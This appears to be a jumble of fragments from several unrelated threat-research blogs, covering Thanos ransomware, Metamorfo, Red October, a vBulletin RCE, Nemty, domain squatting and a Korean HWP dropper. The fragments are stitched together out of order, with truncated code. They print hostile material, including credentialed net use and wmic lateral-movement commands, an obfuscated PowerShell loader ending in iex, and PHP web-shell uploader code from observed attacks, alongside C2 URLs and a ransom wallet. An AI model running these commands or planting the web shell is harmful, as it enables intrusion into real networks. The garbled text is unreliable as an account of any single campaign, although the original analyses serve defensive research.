0	The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system.
0	We do not have visibility into the overall impacts of these attacks or whether or not the threat actors were successful in receiving a payment from the victims.
0	Thanos ransom note displayed after encrypting files.
0	The ransomware was also configured to overwrite the master boot record (MBR), which is an important component loaded on a systems hard drive that is required for the computer to locate and load the operating system.
0	The ransomware overwrites the MBR to display the same ransom message as the previously mentioned text file, which is a technique we do not see often.
0	We believe the threat actors had prior access to these organizations networks, as the samples contained credentials that we believe the actors had stolen from systems on these organizations networks prior to the delivery of the ransomware.
0	This particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in order to load Thanos into memory and to run it on the local system.
0	Palo Alto Networks customers are protected from the attacks discussed in this blog by WildFire, which correctly identifies all related samples as malicious, and Cortex XDR, which blocks the components involved in this ransomware infection.
0	Overview of Thanos Variant Activity
0	We do not know how the actors delivered the Thanos ransomware to the two state-run organizations in the Middle East and North Africa.
0	However, we know the threat group behind the use of these tools had previous access to these networks as they had already obtained valid credentials from the networks.
0	The C# code is the third layer, and it is based on UrbanBishop, which is publicly available as part of the Sharp-Suite framework on GitHub.
0	The PowerShell spreader, which we call LogicalDuckBill, has two primary purposes:
0	Loading and running the Thanos ransomware.
0	Add-Type -TypeDefinition $code -Language CSharp
0	LogicalDuckBill will then check to see if a file named logdb.txt 
0	The spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection cmdlet to get the remote addresses of the current TCP connections on the system.
0	if((Test-NetConnection $tr -Port 445).TcpTestSucceeded){
0	net use x: \\[IP address]\c$ /user:[Victim Domain]\[Username] [Password]
0	copy c:\windows\update4.ps1 x:\windows\update4.ps1
0	wmic /node:[IP address] /user:[Victim Domain]\[Username]
0	The Thanos ransomware was first observed by Recorded Future in February 2020 when it was advertised for sale on underground forums.
0	The Thanos ransomware has code overlaps with other ransomware variants, such as Hakbit, and has a builder that allows the user to customize the sample with a variety of available settings.
0	Like other Thanos ransomware samples, the variant built to run on these two organizations networks uses a 2048-bit RSA public key to encrypt files whose file extensions match those listed in Table 1.
0	The ransom note, as seen in Figure 2, requests 20,000$ worth of Bitcoin be transferred to a wallet 1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9 and a contact email of josephnull@secmail.pro to recover the encrypted files.
0	Contact us at: get-my-data@protonmail.com...", but the code will replace this string with the following string before writing to disk:
0	The interesting part of the overwriting of the MBR in this specific sample is that it does not work correctly, which can be blamed on either a programming error or the custom message included by the actor.
0	As you can see above, the custom message has the bytes " " for the apostrophe character in unicode, but the code attempts to convert each character using the "Convert.ToByte" function to replace a single byte in the initial ransom string.
0	However, the unicode apostrophe character is three bytes long and causes an exception that breaks the MBR overwriting functionality.
0	The code uses a management event watcher that calls a function when a new storage volume is connected using the following WMI query:
0	SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2
0	When the event watcher detects a new storage volume connected, it creates a thread that carries out the file encrypting functionality used by Thanos to encrypt files on the original storage volumes.
0	While we cannot confirm the connection, we believe the actors deploying the Thanos ransomware at the Middle Eastern state-run organization also used a downloader that we call PowGoop.
0	The only code overlap is a common variable name $a that both of the scripts use to store the base64 encoded data prior to decoding, which is not a strong enough connection to suggest a common author.
0	powershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\Users\\[username]\\Desktop
0	config.dat;$t =bDd $a;iex($t);
0	Actors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional systems, specifically on networks of two state-run organizations in the Middle East and North Africa.
0	The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system.
0	Most importantly, this variant of Thanos also included the new ability to overwrite the MBR and display the same ransom message.
0	Overwriting the MBR is a much more destructive approach to ransomware than previously used by Thanos and would require more effort for victims to recover their files even if they paid the ransom.
0	AutoFocus customers can track this ransomware, PowerShell spreading script and the potentially related downloader with the tags Thanos, LogicalDuckBill and PowGoop.
0	Cortex XDR blocks Thanos ransomware, LogicalDuckBill and PowGoop.
0	40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf
0	b60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google installer, GoogleUpdate.exe)
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Popular ResourcesResource Center
0	FortiGuard LabsThreat Analysis Report: This blog originally appeared on the enSilo website and is republished here for threat research purposes.enSilo wasacquiredby Fortinet in October 2019.
0	This blog post describes in detail one of the variants used in this campaign, and highlights unique Tactics, Techniques and Procedures (TTPs) used in this campaign which were not previously disclosed.
0	The following are the static characteristics of theWindows Installer (MSI)downloader, which starts the infection.
0	Created using the "Advanced Installer" tool, which is imported in all of them, as shown in Figure 4.
0	Contain a vmdetect.exe [MD5: 55FFEE241709AE96CF64CB0B9A96F0D7] to avoid detection, as also shown in Figure 4:
0	FIGURE 4: EMBEDDED AICUSTACT.DLL AND VMDETECT.EXE
0	The source of the code that is executed can be a stream contained within the database, a recently installed file, or an existing executable file.
0	This MSI downloader is similar to the one used in the earlier part of the campaign:
0	Note that both URLs use the Brazilian two-letter abbreviation, suggesting the victims origin.
0	This is a legitimate file,AVDump32.exe,and it is digitally signed by"AVAST Software"as shown in Figure 6:
0	The process wmplayer.exe is a rather strange victim for injection, given that various Windows distributions dont come with Windows Media Player installed by default.
0	We can infer from this that this software is probably more commonly used in the victims origin, and that it probably targets home users.
0	Figure 10 shows theCreateProcesscall:
0	FIGURE 10: THE START OF THE DLL INJECTION
0	This makes the payload harder to detect by memory forensics toolkits and security products, which many times look specifically for executable memory.
0	The original function of the API is to be part of the process chain by creating a timer routine.
0	The use ofCreateTimerQueueTimermakes detection harder since the payload will not run in the remote thread context.
0	This kind of technique was previously used in malware variants such as Emotet and Hancitor.
0	These artifacts were not available to us and we couldnt verify their purpose.
0	FIGURE 16: DEBUG OUTPUT OF THE COLLECTED DATA
0	If the victim is from Brazil or Portugal, it will start monitoring running applications in the system using a message loop:
0	FIGURE 17: DEBUGGING RUNNING APPLICATION
0	Some of them are encrypted and will be used as payloads to steal victims data, while others are cursor related resources.
0	Like samples from previous campaigns, Metamorfo can display fake forms on targeted banking sites and steal credentials from its victims.
0	In previouscampaigns, Metamorfo used Windows Update to hide its malicious activity.
0	Metamorfo also makes efforts to evade banking protection and anti-fraud products by setting a hook onLoadLibraryWfunction and checking which DLL is loaded.
0	FIGURE 21: SOME OF THE BANKING PROTECTION AND ANTI-FRAUD SEARCHED STRINGS
0	C00BF102482C61E4CAB3C6B6666697779092FADC
0	https://s3-eu-west-1[.
0	]amazonaws.com/disenyrt3/image2.png
0	https://s3-eu-west-1[.
0	]amazonaws.com/sharknadorki/image2.png
0	https://s3-eu-west-1[.
0	The Metamorfo banking trojan has been around for a few years but it remains a successful payload due to the continuous updating of its features.In this case a fake Adobe installer was used to get the user to execute the malware.
0	To evade detection the threat leveraged a legitimate signed AV executable to side load a malicious DLL file.In the end malware is made to change resulting in a constant emergence of slightly modified variants to successfully execute on a victim machine.
0	TheFortiEDRplatform is capable of detecting the this threat on both pre-execution and post-execution.
0	The Webfiltering service identifies all the network IOCs as malicious.
0	Learn more aboutFortiGuard Labsthreat research and the FortiGuard Security Subscriptions and Servicesportfolio.Sign upfor the weekly Threat Brief from FortiGuard Labs.
0	Learn more about Fortinetsfree cybersecurity training initiativeor about the FortinetNetwork Security Expert program,Network Security Academy program, andFortiVet program.
0	[7F4HRE-375E-ef3-BE9A-OBJT389F53]
0	Compilation date (encrypted)
0	76e1d54a890befed31a369ce40b44ee6
0	__CFStringMakeConstantString
0	/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000004.db
0	The log starts with a MAGIC number 0x5C63F935, then 0x14 bytes of 0xFF, DWORD length of header, header data, then log data.
0	The data consists of tagged records.
0	The following tag values are known to us:
0	0x8002 Time/date
0	0x8004 SHA1 of MAC address, System Volume Serial Number, IE Product ID, the same is written in HKCU,HKLMSOFTWAREMicrosoftADOSoftware32, ProductID
0	Compressed directory log starts with magic 0x5C63F934.
0	Writes to log ===========PROGRAM_STARTED_V_0.1======= followed by time stamp.
0	CONAFreeFolderInfoStructure
0	CONAFreeFolderContentStructure
0	Extracts inbox, outbox, sent, archive messages, drafts, templates, SMS/MMS messages from users folders with statuses SENT, UNREAD, READ, DRAFT, PENDING, DELIVERED, SENDING, or with undefined status UNDEFINED MESSAGE_STATUS or UNDEFINED FOLDER ID.
0	Extracts meetings, birthdays, memos, reminders, notes, To Do lists with repetition attributes NONE, ILY (I suppose it means DAILY but authors must have mistyped), WEEKLY, MONTHLY, YEARLY or Unknown; with priority attributes HIGH, NORMAL, LOW or Unknown; with action attributes NEEDS_ACTION, COMPLETED or Unknown; with alarm attributes NOT_SET, SILENT, WITH_TONE or UNKNOWN; with starting/ending time, subject, location and status.
0	09b4f1e0c03d7dbdac402df4c0625167 15:52:36, October 19, 2010
0	70bee4d4141e6d963aa72a0da08b6683 (724992 bytes)
0	WCELOAD (CAB file installer): cab
0	WMPLAYER (Windows Media Player): mp4, 3gp, amr, avi, wav, wma, wmv, asf, midi, aac, mp3d, mp3
0	IEXPLORE1 (Internet Explorer): res, wsp, file, https, ftp, http, url, ico, html, xml, xhtml, xsl
0	4119  This setting grants the system administrative privileges held by SECROLE_MANAGER to other security roles.
0	Value 16 is User Authenticated role.
0	4101  This setting indicates whether unsigned .cab files can be installed on the device.
0	Value 222 indicates that only OEM, Operator, Manager, UserAuth, UserUnAuth, Operator-TPS can run unsigned .cab file.
0	4102  This setting indicates whether unsigned applications are allowed to run on Windows Mobile devices.
0	4097  This setting restricts the access of remote applications that are using Remote API (RAPI) to implement ActiveSync operations on Windows Mobile devices.
0	Value 1 indicates full access to ActiveSync is provided.
0	A device with one-tier access focuses only on how an application should run based on whether the application is signed with a certificate in the device certificate store.
0	There is no concern with permission restriction.
0	09b4f1e0c03d7dbdac402df4c0625167 (393216 bytes)
0	CeRegQueryValueEx
0	12:00:01, July 7, 2011
0	File names: pdf_viewer.exe, word.exe, excel.exe, iexplorer.exe, img.exe, powerpoint.exe, wceloader.exe, wmplauer.exe
0	All the values and fields in this XML (it is stored inside file) are the same as in Windows Mobile module for Windows.
0	This module is a simple non-interactive FTP client.
0	SetOption(conn_a.VER_SESSION_ID, %removed%)
0	SetOption(conn_a.SEND_DELAY_TIME, [5] 2000)
0	windowscheckupdate.com;windows-genuine.com;windowsonlineupdate.com)
0	SetOption(ftp_file_time, 2012-10-30 00:00:00 )
0	The config defines parameters for the method task_wnftpscan, which uses WinInet library functions to connect to remote FTP server using parameters set in the config and iterate trough directories.
0	Option ftp_crdir is set to 0, which prevents the code from checking if write-access is available.
0	There are max and min file size constraints, set to 1MB and 10 bytes respectively.
0	Additionally there is a date constraint which is set to 2012-10-30, indicating the earliest date of interest.
0	Seems that attackers have already fetched files before that date.
0	GetFileReg module
0	Known variants (all share the same code section, differ in resources):
0	469F4B81A01B1577531812385CAC827E
0	2011.07.18 07:03:52 (GMT)
0	The file is a PE DLL file, 0 exports, compiled with Microsoft Visual Studio 2008.
0	All functionality is implemented in the DllMain function.
0	@fileinforeg_logGETFILEREG_STARTED_V1_%s.txt
0	@fileinforeg_logGETFILEREG_V1_%s.txt
0	The resource is expected to be an INI file compressed using Zlib.
0	Option name Description
0	f_max_size Maximum file size to look for
0	f_min_size Minimum file size to look for
0	f_time_min Minimum file creation or modification time to look for
0	f_time_max Maximum file creation or modification time to look for
0	f_regexp_a Regular expression to match against the filename (must match)
0	f_regexp_d Regular expression to match against the filename (must not match, exclusion list)
0	f_search_path Directories to traverse
0	f_delete_file Delete the file after sending its contents to the C&C server
0	List of C&C server domain names, separated with ;
0	The file is a PE DLL file with 2 exported functions, compiled with Microsoft Visual Studio 2010.
0	All functionality is implemented in the START function.
0	The module is very similar to the GetFileReg module.
0	It is stored on disk as an encrypted file that is loaded by the Scheduler module.
0	Directory traversal and file matching rules
0	On/off switches for features, global settings
0	i_process_all_net_res (new in fileinfo)
0	When turned on, only host_d exclusion list is applied.
0	When turned off, only network paths matching host_a are processed.
0	i_getfile_all_dbx
0	Level of log verbosity: normal, quiet, extend
0	process_ldisks_sleep (new in fileinfo)
0	Delay between each traversal, PROC_LDISKS
0	process_ndisks_sleep (new in fileinfo)
0	Delay between each traversal, PROC_NDISKS
0	The following options apply only to the i_getfile section they are specified in
0	Minimum file creation or modification time to look for
0	Regular expression of network locations that should not be traversed (exclusion list)
0	Every thread has a distinct scope of subjects to process:
0	Directories shared over the network, called PROC_SHARES
0	Disks shared over the network, called PROC_NDISKS
0	Search paths specified in i_getfile sections, called PROC_SPATHS
0	Local disks, called PROC_LDISKS
0	The actual file matching and directory traversal code is almost identical to the one implemented in GetFileReg.
0	Four options control this behavior, each corresponding to one thread:
0	process_ldisks_sleep
0	process_ndisks_sleep
0	process_nshare_sleep
0	The directory traversal threads run their code in infinite loops, and sleep values specify the delay in milliseconds that should pass between iterations.
0	Although the module extracts the C&C server information from its configuration file, it does not interact with the C&C server in any way.
0	Since traversal routines are now executed in separate threads, the fileinfo module introduces continuous mode of operation.
0	Regular expression to match against the filename (must not match, exclusion list)
0	Remote disks are enumerated from C$ to Z$
0	Minimum file size to look for
0	spec_check_task_existance_a
0	Exploits in the Wild for vBulletin Pre-Auth RCE Vulnerability CVE-2020-17496
0	          By Haozhe Zhang, Qi Deng, Zhibin Zhang and Ruchna
0	Tags: CVE-2019-16759, CVE-2020-17496, exploits, threat prevention, vulnerabilities
0	This post is also available in: 
0	 (Japanese)Executive Summary
0	In September 2019, a remote code execution (RCE) vulnerability identified as CVE-2019-16759 was disclosed for vBulletin, a popular forum software.
0	At that time, Unit 42 researchers published a blog on this vBulletin vulnerability, analyzing its root cause and the exploit we found in the wild.
0	More than 100,000 sites are built on vBulletin, including the forums of major enterprises and organizations, so its imperative to patch immediately.
0	In this blog, we provide details on the bypass of the patch of the vulnerability, proof of concept code (PoC) to demonstrate the vulnerability and information on attacks we have observed in the wild.
0	Palo Alto Networks customers are protected by the following services and products via Threat Prevention signatures and URL Filtering blocks the related C2 traffic.
0	Root Cause Analysis of the Vulnerability (CVE-2020-17496)
0	As shown in Figure 1, the values of parameters for this function are from $_REQUESTS, $_GET and $_POST.
0	Since the generated code has a line of vB5_Template_Runtime::evalPhp('' .
0	$widgetConfig['code'], the malicious code in the request will be executed.
0	if (empty($widgetConfig) AND !empty($widgetinstanceid))
0	''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);
0	$final_rendered .= '' . '
0	$widgetid = $widgetConfig['widgetid'];
0	$final_rendered .= '' . '
0	vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '
0	if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering'))
0	$final_rendered .= ' ' . ''
0	12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879
0	''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);$final_rendered .= '' . '
0	vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '
0	Eval the PHP code rendered from the XML template
0	Beginning from version 5.5.5, a fix for CVE-2019-16759 was introduced into the function callRender() as shown in Figure 4.
0	It uses a disallow-list mechanism to check the template name.
0	If the name is widget_php, the engine wont render the requested template.
0	After the fix, widget_php is the only template that can be used to execute PHP code, as shown in Figure 5.
0	Figure 5. evalPhp() executes code only when the template is widget_php
0	The fix makes widget_php the only template that can be utilized for PHP code execution, and meanwhile, restricts the users access to this template.
0	However, in the latest bypass, we found that another template can be utilized to load this template.
0	That template is widget_tabbedcontainer_tab_panel.
0	This template widget_tabbedcontainer_tab_panel shown in Figure 6, above, is a template that can be used to render multiple child templates.
0	The code below is the PHP code that is rendered from the widget_tabbedcontainer_tab_panel template in XML.
0	vB5_Template_Runtime::includeTemplate($subWidget['template'],array('widgetConfig' => $subWidget['config'], 'widgetinstanceid' => $subWidget['widgetinstanceid'], 'widgettitle' => $subWidget['title'], 'tabbedContainerSubModules' => $subWidget['tabbedContainerSubModules'], 'product' => $subWidget['product'])) . '
0	Based on our analysis, we can construct the exploit code to prove the functionality.
0	The calling of the function callRender requires the POST HTTP method (according to Figure 7).
0	Figures 9 and 10 show some other manipulated requests that have the same effect.
0	In the URL, the child template name widget_php and the malicious code phpinfo();exit(); are in the array subWidget as the first element.
0	We caught the first incident of CVE-2020-17496 exploitation on Aug. 10, 2020, and later found that exploitation attempts from different IP addresses are ongoing.
0	Note that these are disparate attacks and not a coordinated effort by any particular attackers.
0	These scans are trying to find vulnerable sites and collect that information, which is an early step of cyber attacks.
0	The traffic is shown in Figures 11-15.
0	These payloads try to execute system commands echo and id, which can give attackers knowledge of whether or not the targets are vulnerable according to the responses.
0	The code provides an upload page for attackers to upload any files and conduct the follow-up steps of a cyber attack.
0	echo"<font color=#ff0000>".php_uname().
0	echo"<br><form method=post enctype=multipart/form-data>";
0	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
0	echo"<b>".$_FILES["f"]["name"];
0	";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "
0	"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload cok"; } } ?>
0	echo"<br><form method=post enctype=multipart/form-data>";
0	There are multiple kinds of exploit attempts against vBulletin pre-auth RCE vulnerability CVE-2020-17496 being detected by our threat platform.
0	As a widely used forum software package that has been running for a long time in the market, it has been identified as a prized target by attackers.
0	vBulletin released the patch to fix this vulnerability on Aug. 10, 2020.
0	Applying the patch to the latest version will mitigate the risks, which is strongly advised.
0	Palo Alto Networks customers are protected by the following services and products:
0	Threat Prevention Signature 59133 and 80671.
0	Exploits in the Wild for vBulletin Pre-Auth RCE Vulnerability 
0	88DDD8A1B77477AAFFD1BB163B9770D72A77BF29BFCA226E79C28D15BEF983ED
0	Mirai Variant (Sora) Hashes
0	3bfec4e039805091fe30fa978d5ec7f28431bb0fca4b137e075257b3e1c0dd4
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Please enter your email address!
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	In 2019, FortiGuard Labs was investigating the Sodinokibi ransomware family, when we came across the newly discovered Nemty Ransomware.
0	Interestingly, as we analyzed this new malware, we also encountered an artifact embedded in its binary that we were very much familiar with since it was also used by the GandCrab ransomware before the threat actors announcedretirement.
0	It is also interesting to see that the Nemty ransomware is being distributed using the same method as Sodinokibi, a malware that has strong similarities to GandCrab.
0	This report discusses the technical aspects of the new ransomware, including some irregularities that make us think that it is still in its early stage of development.
0	The first sample that we were able to analyze came from a link that was shared by the@BotySrtTwitter bot account, which posts Pastebin links leading to the Sodinokibi and Buran malware families.
0	Link that was supposed to lead to a Sodinokibi payload
0	The links lead to Powershell scripts that execute embedded malware payloads usingReflective PE Injection.
0	We collected the links that were tagged as Sodinokibi, expecting to extract samples of that ransomware.
0	However, as we were running our automation to extract the embedded binaries, we found an unsupported file, and as we investigated further, we discovered it was the new Nemty ransomware instead.
0	In our initial analysis of the ransomware, we found a link embedded in its binary which we are very familiar with.
0	It is a statement that was actually used by GandCrab when it was having its vaccine war with Ahnlab, as we detailed previously in our article discussing the evolution ofGandCrab v4.x.
0	The strings used throughout Nemtys execution are obfuscated using a combination of simple base64 encoding and RC4 encryption.
0	And to express their unsurprising animosity towards the security industry, this variant usef**kav\x00as its vulgar RC4 encryption key.
0	In fact, this may be the first time that we have seen a ransom malware use such a strong  albeit overkill and inefficient for its purpose  encryption algorithm to protect information.
0	In most cases, 2048 and 4096 key sizes are more than enough to secure any message.
0	Using the longer key size adds a large overhead due to significantly longer key generation and encryption times.
0	This is clearly an error, which implies that this malware may be in its early stages.
0	It also avoids files with specific extensions, as listed in the next image, although it is done in a very unusual and rather inefficient way using case-insensitive string comparison.
0	This is possibly an affiliate ID, which means that Nemty is possibly being sold as a Ransomware-as-a-Service (RaaS).
0	Nemtys Ransom Note and Payment Page
0	This is possibly an affiliate ID, which means that Nemty is possibly being sold as a Ransomware-as-a-Service (RaaS).
0	The payment page is hosted in the Tor network for anonymity, which has become a standard for ransomware operations.
0	To get to the main payment page, the victim must upload the encrypted configuration file and an encrypted file for a decryption test.
0	As of this writing, the threat actors are demanding $1000 in bitcoin in exchange for the decryption of the victims files.
0	There is a function to send the encrypted configuration to exfiltrate theconfigurationdata from the victims machine, although it clearly has not yet been practically implemented.
0	This is because the hardcoded IP address, which is supposed to be the threat actors C2 server, is actually the victim systems loopback address, 127.0.0.1.
0	It is possible that they simply have not configured an operational server to receive the data yet, which is another clue that this ransomware is still in the development stage.
0	The payment page supports the Russian language, which is very unusual and confusing.
0	Considering the embedded image with the Russian statement that was discussed later, it is easy to assume that the developers of Nemty are of Russian descent.
0	Normally, they would avoid infecting Russian users so as to not attract attention from authorities in their region.
0	However, this does not seem to be the case for this ransomware.
0	Despite that, however, in its current state, it can still carry out file encryption on a victims system, making it a real threat..
0	As of this writing, a new version of this malware has been found and is already being analyzed.
0	Fortinet customers are protected by the following:
0	Samples are detected by our W32/Gen.NVV!tr.ransom signature
0	FortiSandbox rates the malwares behavior as high risk
0	267a9dcf77c33a1af362e2080aaacc01a7ca075658beb002ab41e0712ffe066e (Nemty ransomware from Powershell) - W32/Gen.NVV!tr.ransom
0	hxxps://pastebin.com/raw/NE3TJ3z1 (link to the Powershell loader)
0	127.0.0.1:9050/public/gate?data={encrypted configuration}
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	We have also discussed several irregularities and inefficiencies in its code, implying that it is still in its early stage of development.
0	The purpose of squatting domains is to confuse users into believing that the targeted brands (such as Netflix) own these domain names (such as netflix-payments[.]com) or to profit from users typing mistakes (such as whatsalpp[.]com for WhatsApp).
0	While cybersquatting is not always malicious toward users, it is illegal in the U.S.,[1] and squatting domains are often used or repurposed for attacks.
0	The Palo Alto Networks squatting detector system discovered that 13,857 squatting domains were registered in December 2019, an average of 450 per day.
0	We found that 2,595 (18.59%) squatted domain names are malicious, often distributing malware or conducting phishing attacks, and 5,104 (36.57%) squatting domains we studied present a high risk to users visiting them, meaning they have evidence of association with malicious URLs within the domain or are utilizing bulletproof hosting.
0	We also ranked the Top 20 most abused domains in December 2019 based on adjusted malicious rate, which means that a domain is either a target of many squatting domains or most of these squatting domains are confirmed malicious.
0	We found that domain squatters prefer profitable targets, such as mainstream search engines and social media, financial, shopping and banking websites.
0	Malware distribution: A domain mimicking Samsung (samsungeblyaiphone[.]com) hosting Azorult malware to steal credit card information.
0	Command and control (C2): Domains mimicking Microsoft (microsoft-store-drm-server[.]com and microsoft-sback-server[.]com) attempting to conduct C2 attacks to compromise an entire network.
0	Re-bill scam: Several phishing sites mimicking Netflix (such as netflixbrazilcovid[.]com) set up to steal victims money by first offering a small initial payment for a subscription to a product like weight loss pills.
0	However, if users dont cancel the subscription after the promotion period, a much higher cost will be charged to their credit cards, usually $50-100.
0	Potentially unwanted program (PUP): Domains mimicking Walmart (walrmart44[.]com) and Samsung (samsungpr0mo[.]online) distributing PUP, such as spyware, adware or a browser extension.
0	Typosquatters intentionally register misspelled variants (such as whatsalpp[.]com) of target domain names (whatsapp[.]com) to profit from users typing mistakes or to deceive users into believing that they are visiting the correct target domain.
0	The most frequent typosquatting techniques include registering names one edit distance from the original domain, as these are the most common and overlooked mistakes users make.
0	For more information, readers can refer to academic research papers on the scale and malicious use of typosquatting.
0	Combosquatting is another widespread registration abuse that combines popular trademarks with words such as security, payment or verification.
0	Combosquatting domains like netflix-payments[.]com are often used in phishing emails, by scam websites and for social engineering attacks to convince users that they are visiting web content maintained by the targeted trademark.
0	Bitsquatting domains have a character that differs in one bit (such as micposoft[.]com) from the same character as the targeted legitimate domain (microsoft[.]com).
0	Bitsquatting can benefit attackers because a hardware error can cause a random bit-flip in memory where domain names are stored temporarily.
0	The average malicious rate of the 13,857 squatting domains is 18.59% (2,595) and the average suspicious rate is 36.57% (5,104).
0	Specifically, we studied popular registrars, name services, autonomous systems and certificate authorities used by domain squatters.
0	For each chart outlined below, we considered the number of squatting detections to reflect their popularity among domain squatters, and the malicious IOC rate to quantify the degree of threat to users.
0	Additionally, parkingcrew.net and above.com are popular parking services because they provide a simple monetization avenue to domain owners, achieved by pointing domain names DNS records to their name servers.
0	The top three most abused AS (19495, 48635, 262254) belong to the three most abused name service providers, respectively (freenom.com, registrar.eu, ddos-guard.net).
0	The fourth most abused AS (40034) is owned by ztomy.com, a service favored for DNS hijacking attacks.
0	In these campaigns, attackers set up hundreds of subdomains mimicking popular target domains under com-secure-login[.]info and com-finder-me[.]info.
0	An example level-squatting subdomain is www.icloud.com-secure-login[.]info.
0	Our system discovered many level-squatting domains registered at TLD Registrar Solutions using the .support TLD (top-level domain), including icloud.com-iphone[.]support and apple.com.recover[.]support, which users might confuse with legitimate Apple technical support services.
0	All of the different squatting techniques we discussed can be used to lure users into believing that a squatting domain is owned by the legitimate brand and to increase the efficiency of phishing and scam campaigns.
0	One example is a combosquatting domain, secure-wellsfargo[.]org, which targets Wells Fargos customers.
0	Our squatting detection system captured squatting domains mimicking Microsoft, microsoft-store-drm-server[.]com on January 30, 2020, and microsoft-sback-server[.]com on February 3, 2020.
0	From the Palo Alto Networks WildFire Malware Analysis Engine, we retrieved similar malware samples, including fa28b59eb0ccd21d3994b0778946679497399b72c2e256ebf2434553cb7bf373 and e7fb436bf7d8784da092315bce1d3511a6055da41fe67362bad7a4c5d3f0294e , connecting to them.
0	Tracking 217.182.227[.]117, we are able to find other C2 domains used by this campaign: store-in-box[.]com from Jan. 27-28, stt-box[.]com from Jan. 29-31, microsoft-store-drm-server[.]com from Jan. 31-Feb. 2, and microsoft-sback-server[.]com on February 3.
0	A PUP could be either standalone software, like spyware or adware, or a browser extension.
0	A common and easy way to monetize user traffic is to use a parking service by pointing the squatting domains IP address or NS record to the parking services servers.
0	Figure 15 provides an example of a parked domain mimicking RBC Royal Bank, rbyroyalbank[.]com, leveraging a popular parking service, ParkingCrew, to generate profit based on how many users land on the site and click the advertisements.
0	Special thanks to Daiping Liu, Kelvin Kwan, Laura Novak, Jun Javier Wang, Vicky Ray, Eddy Rivera, Erica Naone and Arun Kumar for their help with improving the blog.
0	Analyzing the squatting ecosystem, we found that domain squatters prefer certain types of target domains, registrars, hosting services and certificate authorities.
0	Judging by the information within the HWP file, the malware developer must have modified the document with North Korea-related questions that were used on December 15, 2020, during the debate on North Korea.
0	If the malicious document is not located in the file path C:\User\[Username]\AppData\, the internal malicious object cannot be run.
0	Therefore, all users including those who are engaged in North Korea-related field must take extra caution when handling files to prevent any damage from document files disguised as question documents like above.
0	V3, AhnLabs anti-malware solution, has implemented the detection in its 2021.04.09.04 engine, and the current detection status of other anti-malware providers are as follows:
0	Figure 3  Detection status board of VirusTotal
0	V3 products detect and block the files using the following aliases:
0	As shown in the Figure 1, the malware was distributed and disguised as a document file with questions written by a certain broadcasting media, and it contains a malicious object within.
0	Dropper/HWP.Agent (2021.04.09.04)Trojan/BAT.Runner (2021.04.09.04)Downloader/VBS.Agent (2021.04.09.04)
0	hxxp://yegip.kr/se2/photo_uploader/plugin/update/list.php?query=0
0	However, one similarity with the previous document is that an object was inserted into the document and it was used as a link to the relative path.
0	Since the publication of our report, our colleagues from Seculert have discovered and posted a blog about the usage of another delivery vector in the Red October attacks (http://blog.seculert.com/2013/01/operation-red-october-java-angle.html).
0	In addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it appears that the attackers also infiltrated victim network(s) via Java exploitation (MD5: 35f1572eb7759cb7a66ca459c093e8a1  NewsFinder.jar), known as the Rhino exploit (CVE-2011-3544).
0	The domain involved in the attack is presented only once in a public sandbox at malwr.com (http://malwr.com/analysis/c3b0d1403ba35c3aba8f4529f43fb300/), and only on February 14th, the very same day that they registered the domain hotinfonews.com:
0	+372.54055298Creation Date: 14-Feb-2012Expiration Date: 14-Feb-2013
0	Following that quick public disclosure, related MD5s and links do not show up in public or private repositories, unlike the many other Red October components.
0	And, the functionality embedded on the server side PHP script that delivers this file is very different from the common and related functionality that we see in the backdoors used throughout the five year campaign.
0	The crypto routines maintained and delivered within the exploit itself are configured such that the key used to decrypt the URL strings within the exploit is delivered within the Java applet itself.
0	Here is our PHP encryption routine to encrypt the Url for the downloader content:
0	And this is the function to embed the applet in the HTML, passing the encrypted URL string through parameter p:
0	Here is the code within the applet that consumes the encrypted strings and uses it.
0	As more information about the Red October becomes available and third parties are publishing their own research into the attacks, it becomes clear that the scope of the operation is bigger than originally thought.
0	In addition to the Java exploit presented here, its possible that other delivery mechanisms were used during the 5 years since this gang was active.
